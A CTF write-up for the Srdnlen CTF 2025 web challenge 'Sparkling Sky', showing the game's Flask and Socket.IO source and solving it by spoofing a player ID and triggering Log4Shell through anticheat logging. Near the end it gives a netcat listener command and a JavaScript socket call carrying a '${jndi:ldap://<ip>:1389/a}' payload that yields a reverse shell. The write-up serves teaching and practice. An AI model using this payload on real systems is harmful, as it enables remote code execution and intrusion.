---
title: Sparkling Sky
description: |
  I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up.

  It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself.

  username: user1337
  password: user1337
  website: http://sparklingsky.challs.srdnlen.it:8081
  author: @sanmatte
categories: ["ctf", "Srdnlen CTF 2025"]
tags: ["web"]
media_subpath: "/assets/posts/2025/srdnlenctf/sparkling-sky"
---

We are given a Python Flask server, which uses Socket.IO and Apache Spark.

```py
from flask import Flask
from flask_socketio import SocketIO
from flask_login import LoginManager
from flask import Flask
from flask_sqlalchemy import SQLAlchemy

socketio = SocketIO()
login_manager = LoginManager()
db = SQLAlchemy()
def create_app():

    app = Flask(__name__)
    app.config.from_object('config.Config')

    socketio.init_app(app, cors_allowed_origins="*")
    login_manager.init_app(app)
    db.init_app(app)

    from game.models import User
    with app.app_context():
        db.create_all()

    from game.utils import init_db
    # Prepopulate the db
    with app.app_context():
        init_db()

    from game.routes import bp as game_bp
    app.register_blueprint(game_bp)

    # Import the socket events after the app is created
    from game.socket import init_socket_events
    from game.utils import update_birds_from_db
    with app.app_context():
        players = update_birds_from_db()
    init_socket_events(socketio, players)

    return app
```
{: file="app.py" }


```py
from pyspark.sql import SparkSession
import math
import time

log4j_config_path = "log4j.properties"

spark = SparkSession.builder \
    .appName("Anticheat") \
    .config("spark.driver.extraJavaOptions",
            "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:" + log4j_config_path) \
    .config("spark.executor.extraJavaOptions",
            "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:" + log4j_config_path) \
    .getOrCreate()

logger = spark._jvm.org.apache.log4j.LogManager.getLogger("Anticheat")

def log_action(user_id, action):
    logger.info(f"User: {user_id} - {action}")


user_states = {}

# Anti-cheat thresholds
MAX_SPEED = 1000  # Max units per second

def analyze_movement(user_id, new_x, new_y, new_angle):

    global user_states

    # Initialize user state if not present
    if user_id not in user_states:
        user_states[user_id] = {
            'last_x': new_x,
            'last_y': new_y,
            'last_time': time.time(),
            'violations': 0,
        }

    print(user_states[user_id])

    user_state = user_states[user_id]
    last_x = user_state['last_x']
    last_y = user_state['last_y']
    last_time = user_state['last_time']

    # Calculate distance and time elapsed
    distance = math.sqrt((new_x - last_x)**2 + (new_y - last_y)**2)
    time_elapsed = time.time() - last_time
    speed = distance / time_elapsed if time_elapsed > 0 else 0

    print(distance, time_elapsed, speed)

    # Check for speed violations
    if speed > MAX_SPEED:
        return True

    # Update the user state
    user_states[user_id].update({
        'last_x': new_x,
        'last_y': new_y,
        'last_time': time.time(),
    })

    return False 
```
{: file="anticheat.py" }

```py
from flask_login import UserMixin
from app import db

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(300), nullable=False, unique=True)
    color = db.Column(db.String(10), nullable=True)
    is_playing = db.Column(db.Boolean, nullable=True)  
```
{: file="models.py }

```py
from flask import render_template, redirect, url_for, request, flash
from flask_login import login_user, logout_user, login_required, current_user
from . import bp
from .models import *
from app import login_manager
from .utils import *
from random import randint

@login_manager.user_loader
def load_user(user_id):
    user = User.query.get(int(user_id))
    return user

@login_manager.unauthorized_handler
def unauthorized_callback():
    return redirect('/login')


@bp.route('/')
@login_required
def home():
    return render_template('home.html')


@bp.route('/play')
@login_required
def play():
    current_players = User.query.filter_by(is_playing=True).with_entities(User.id).all()
    current_players = [user_id[0] for user_id in current_players]
    userID = int(current_user.get_id())
    if userID in current_players:
        return render_template('play.html')
    else:
        return render_template("spectate.html", position=randint(1, 300))
    

@bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        user = User.query.filter(User.username == username).first()
        if user is None:
            return redirect(url_for('game.login'))
        if user.password == password:
            login_user(user)
            return redirect(url_for('game.home'))
        
        return redirect(url_for('game.login'))
    
    return render_template('login.html')

@bp.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Logged out successfully!')
    return redirect(url_for('game.login'))
```
{: file="routes.py" }

```py
from flask_socketio import emit
from flask_login import current_user, login_required
from threading import Lock
from .models import *
from anticheat import log_action, analyze_movement
lock = Lock()

def init_socket_events(socketio, players):
    @socketio.on('connect')
    @login_required
    def handle_connect():
        user_id = int(current_user.get_id())
        log_action(user_id, "is connecting")
        
        if user_id in players.keys():
            # Player already exists, send their current position
            emit('connected', {'user_id': user_id, 'x': players[user_id]['x'], 'y': players[user_id]['y'], 'angle': players[user_id]['angle']})
        else:
            # TODO: Check if the lobby is full and add the player to the queue
            log_action(user_id, f"is spectating")
        emit('update_bird_positions', players, broadcast=True)

    @socketio.on('move_bird')
    @login_required
    def handle_bird_movement(data):
        print(f"got socket connection with {data}")
        user_id = data.get('user_id')
        if user_id in players:
            del data['user_id']
            if players[user_id] != data:
                with lock:
                    players[user_id] = {
                        'x': data['x'],
                        'y': data['y'],
                        'color': 'black',
                        'angle': data.get('angle', 0)
                    }
                    print("Calling anticheat")
                    if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)):
                        log_action(user_id, f"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}")
                        # del players[user_id] # Remove the player from the game - we are in beta so idc
                    emit('update_bird_positions', players, broadcast=True)

    @socketio.on('disconnect')
    @login_required
    def handle_disconnect(data):
        user_id = current_user.get_id()
        if user_id in players:
            del players[user_id]
        emit('update_bird_positions', players, broadcast=True)
```
{: file="socket.py }

```py
`from .models import db, User
import secrets
import string
from uuid import uuid4 as userID

def init_db():
    if User.query.first() is None:
        for i in range(10):
            username = 'user' + str(userID())
            password = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
            user = User(username=username, password=password, color=secrets.choice(['black', 'blue', 'white', 'green', 'red', 'grey', 'yellow', 'cyan', 'orange', 'pink']), is_playing=True)
            db.session.add(user)
            db.session.commit()
        user = User(username='user1337', password='user1337', color=secrets.choice(['black', 'blue', 'white', 'green', 'red', 'grey', 'yellow', 'cyan', 'orange', 'pink']), is_playing=True)
        db.session.add(user)
        db.session.commit()

def get_players():
    current_players = User.query.filter_by(is_playing=True).with_entities(User.id).all()
    current_players = [user_id[0] for user_id in current_players]
    return current_players

from random import randint, uniform

def update_birds_from_db():
    players = {}
    current_players = get_players()
    for user_id in current_players:
        players[user_id] = {
            'x': randint(0,500),
            'y': randint(0,500),
            'color': 'black', # TODO: implement color from db
            'angle': uniform(0,6)
        }
    return players
```
{: file="utils.py" }

We can login to the app using the credentials in the description and join the game.

![](1.png)

However, we are just spectators. We cannot play the game.

The browser and the server also communicate via Socket.IO. But, if we look at `socket.py`, there is absolutely no validation
for the input. Even if our account is just a spectator, we can call any function. `handle_bird_movement`, even if it uses
the user ID, it does not take it from the cookies. It takes it from user-controlled input, so we can provide any ID we like,
which is a player, not a spectator.

The `anticheat.py` file contains some configuration for Apache Spark. It also configures Log4j, which is vulnerable to CVE-2021-44228.
We just have to trigger the anticheat, which calls `log_action`, which will be passed to Log4j.

We still need to pass the `analyze_movement` function. It calculates if our speed does not exceed some value (speed is calculated from
other data like coordinates and timestamps). If it finds the movement suspicious, it will log the attempt. It also interpolates the 
`angle` property, which is never used in `analyze_movement`, so it can be whatever we like.

I used the following [exploit](https://github.com/kozmer/log4j-shell-poc/). I installed `openjdk-11-jdk` (that's what the challenge uses as well),
then in `poc.py` I replaced all relative paths to the JDK with the name of the binaries, which are now in `PATH`. I ran 
`python3 poc.py --userip <ip> --webport 8000 --lport 9001`, which starts the LDAP server on 1389 and the HTTP server on 8000, then in 
another terminal I started a netcat listener on 9001 (`nc -lvnp 9001`). I port forwarded the 3 ports and went to trigger the exploit.

We can write some server/browser code to interact with the socket, but we can directly use the DevTools console on the actual website.
Let's see `play.html`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bird Movement Game</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
<style>
    body {
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #87CEEB;
        background: linear-gradient(200deg, #1a2a6c, #1fb275, #2de5fd); /* Animated gradient */
        background-size: 800% 800%;
        animation: gradientAnimation 10s ease infinite;
        font-family: 'Impact', Charcoal, sans-serif;
    }

    @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            25% { background-position: 50% 50%; }
            50% { background-position: 100% 50%; }
            75% { background-position: 50% 50%; }
            100% { background-position: 0% 50%; }
        }

    #gameCanvas {
        border: 2px solid #333;
        border-radius: 12px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        background-color: rgba(255, 255, 255, 0.8); /* Light background for better visibility */
    }

    .bird {
        width: 50px;
        height: 50px;
        position: absolute;
    }

    .scoreboard {
        position: absolute;
        top: 10px;
        left: 10px;
        color: white;
        font-size: 20px;
        background: rgba(0, 0, 0, 0.5);
        padding: 10px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
</style>
</head>
<body>
    <canvas id="gameCanvas" width="800" height="600"></canvas>
    <style>
        #gameCanvas {
            border: 16px solid #333;
            border-radius: 8px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
            background: radial-gradient(circle, rgba(255, 255, 255, 0.9), rgba(240, 240, 240, 0.9));
            background-size: cover;
            transition: transform 0.3s ease, border-color 0.3s ease;
            position: relative;
            overflow: hidden; 
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(240, 240, 240, 0.9));
            background-size: cover;
            transition: transform 0.3s ease, border-color 0.3s ease;
        }
    </style>

    <script>
        const socket = io();

        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');

        let myBird;
        let targetX;
        let targetY;
        socket.on('connected', (data) => {
            myBird = data;
            targetX = myBird.x;
            targetY = myBird.y;
            updateBirdPosition();
        });



        const speed = 10; 
        const keyMap = {}; 
        const birdImage = new Image();
        birdImage.src = '/static/img/bird.png';  
        


        function drawBird(bird) {
            const birdWidth = 65;
            const birdHeight = 65;

            ctx.save();
            ctx.translate(bird.x + birdWidth / 2, bird.y + birdHeight / 2); 
            
            ctx.rotate(bird.angle); 
            ctx.drawImage(birdImage, -birdWidth / 2, -birdHeight / 2, birdWidth, birdHeight); 
            ctx.restore();
        }

    
        function drawAllBirds(players) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);  
            for (let userId in players) {
                drawBird(players[userId]);  
            }
        }
        const angleSpeed = 0.2;
   
        function updateBirdPosition() {
            let dx = 0;
            let dy = 0;
            let targetAngle = myBird.angle;
            let hasmoved = false;
            // Update target position based on pressed keys
            if (keyMap['ArrowUp']) {
                dy = -speed;
                targetAngle = 0 * Math.PI / 180;
                hasmoved = true;
            }
            if (keyMap['ArrowDown']) {
                dy = speed;
                targetAngle = 180 * Math.PI / 180;
                hasmoved = true;    
            }
            if (keyMap['ArrowLeft']) {
                dx = -speed;
                targetAngle = 270 * Math.PI / 180;
                hasmoved = true;
            }
            if (keyMap['ArrowRight']) {
                dx = speed;
                targetAngle = 90 * Math.PI / 180;
                hasmoved = true;
            }

            // Smoothly rotate towards the target angle
            let angleDifference = targetAngle - myBird.angle;


            if (angleDifference > Math.PI) {
                targetAngle -= 2 * Math.PI;
            } else if (angleDifference < -Math.PI) {
                targetAngle += 2 * Math.PI;
            }

            
            angleDifference = targetAngle - myBird.angle;

            if (Math.abs(angleDifference) > angleSpeed) {
                myBird.angle += Math.sign(angleDifference) * angleSpeed; 
            } else {
                myBird.angle = targetAngle; 
            }
            
            targetX = Math.min(Math.max(0, targetX + dx), canvas.width - 50);
            targetY = Math.min(Math.max(0, targetY + dy), canvas.height - 50);
            
            const easing = 1; 
            myBird.x += (targetX - myBird.x) * easing;
            myBird.y += (targetY - myBird.y) * easing;
            
            if (hasmoved){
            socket.emit('move_bird', myBird);
            }
            
            requestAnimationFrame(updateBirdPosition);
        }

        window.addEventListener('keydown', (event) => {
            keyMap[event.key] = true;
        });

        window.addEventListener('keyup', (event) => {
            keyMap[event.key] = false;
        });

        socket.on('update_bird_positions', (players) => {
            drawAllBirds(players);
        });
    </script>
</body>
</html>               
```

Since the code is not minified, we have direct access to the `socket` variable in DevTools. We can directly interact with the
socket. To trigger the anticheat, we can send 2 movements at a short interval, with very different coordinates.

```js
socket.emit("move_bird", {"user_id": 1, "x": 0, "y": 0, "angle": "${jndi:ldap://<ip>:1389/a}"}); 
setTimeout(() => {
    socket.emit("move_bird", {"user_id": 1, "x": 142142352425524, "y": 4322525524, "angle": "${jndi:ldap://<ip>:1389/a}"})
}, 2000);
```

After triggering the exploit, we get a reverse shell on the netcat listener.
